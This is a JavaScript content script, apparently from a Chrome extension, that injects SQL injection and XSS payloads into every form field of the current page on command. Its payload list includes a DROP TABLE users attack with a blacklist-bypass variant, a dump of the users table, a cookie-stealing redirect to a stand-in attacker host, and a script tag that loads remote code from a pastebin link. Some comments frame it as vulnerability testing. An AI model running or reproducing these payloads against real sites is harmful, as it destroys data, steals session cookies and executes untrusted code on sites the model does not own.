$(document).ready(function() {
  var attacks = [[],[],[]];

  chrome.extension.onRequest.addListener(function(request, sender, sendResponse){
    if (request.type == 1 || request.type == 2) {
      sendResponse({acknowledged: "Mission accepted."});
      inject(request.type, request.attack);
    } else {
      sendResponse({acknowledged: "Mission denied."});
    }
  });

  function inject(type, attack) {
    var attack = attacks[type][attack];
    var inputs  = document.getElementsByTagName('input');
    var textareas = document.getElementsByTagName('textarea');

    for (i in inputs) {
      var input = inputs[i];
      var injection;
      
      if (input.type === 'password') {
        injection = attack('password_field');
      } else {
        injection = attack(input.name);
      }

      if (input.type === 'email') { 
        input.type = 'text';
      }

      if (input.type === 'checkbox') {
        input.checked = 'checked';
      }

      if (input.type === 'radio') {
        input.checked = 'checked';
      }

      input.value = injection;
      console.log(input.value);
    }

    for (t in textareas) {
      var textarea = textareas[t];
      injection = attack(textarea.name);
      textarea.value = injection;
      console.log(textarea.value);
    }
  }

  /* SQL debug assitance: attempts to create a table and insert a value for every vulnerable field. */
  var sql_debug = function(name) {
    return "CREATE TABLE IF NOT EXISTS sql_vuln (field TEXT); INSERT INTO sql_vuln VALUES('"+name+"');"; 
  }

  /* XSS debug assistance: creates a paragraph with some text that can be searched for by JS to notify
     of XSS vulnerabilities. */
  var js_debug = function(name) {
    return "$('body').append('<p class=\\'xss_vulnerable\\' style=\\'color:red;font-weight:bold;\\'>"+name+" is vulnerable to XSS.</p>');";
  }

  /* Basic SQL */
  attacks[1][0] = function(name) {
    return "' or '1'='1' -- '" + sql_debug(name);
  }

  /* DROP TABLE users attack */
  attacks[1][1] = function(name) {
    return "a';DROP TABLE users;" + sql_debug(name);
  }

  /* Select everything from users attack */
  attacks[1][2] = function(name) {
    return "a';SELECT * FROM users WHERE 't' = 't';" + sql_debug(name);
  }

  /* Attack on insert. */
  attacks[1][3] = function(name) {
    return "a');"+ sql_debug(name)+"--";
  }

  /* Bypass blacklisting. */
  attacks[1][4] = function(name) {
    return "a';DRO/*bypass blacklisting*/P TABLE users;"+ sql_debug(name)+"--";
  }

  /* Blind injection. */
  attacks[1][5] = function(name) {
    return "SELECT IF(1=1,'true','false');"+ sql_debug(name)+"--";
  }

  /* Exec blind injection. */
  attacks[1][6] = function(name) {
    return "1 EXEC SP_ (or EXEC XP_);"+ sql_debug(name)+"--";
  }

  /* Basic XSS */
  attacks[2][0] = function(name) {
    return "<script>console.log('"+name+" is vulnerable to XSS.');"+js_debug(name)+"</script>";
  }

  /* Style XSS Attack */
  attacks[2][1] = function(name) {
    return "@import\"javascript:console.log('"+name+" is vulnerable to a style attack.')\";"+js_debug(name);
  }
  
  /* Attribute attack */
  attacks[2][2] = function(name) {
    return "\"><script>console.log('"+name+" is vulnerable to an attribute attack.');"+js_debug(name)+"</script>";
  }

  /* Redirect cookie steal */
  attacks[2][3] = function(name) {
    return "<script>document.location='http://attackerhost.example/cgi-bin/cookiesteal.cgi?'+document.cookie</script>";
  }

  /* src/href attack */
  attacks[2][4] = function(name) {
    return "javascript:console.log('"+name+" is vulnerable to XSS.');alert('"+name+" is vulnerable to XSS.');"
  }

  /* encoded XSS */
  attacks[2][5] = function(name) {
    return ">%22%27><img%20src%3d%22javascript:alert(%27"+name+"%27)%22>";
  }
  
  /* URL XSS attack */
  attacks[2][6] = function(name) {
    return "AK%22%20style%3D%22background:url(javascript:alert(%27"+name+"%27))%22%20OS%2";
  }
  
  attacks[2][7] = function(name) {
    return "<script src=\"http://pastebin.com/raw.php?i=a6Mw8Zjg\"></script>";
  }
});
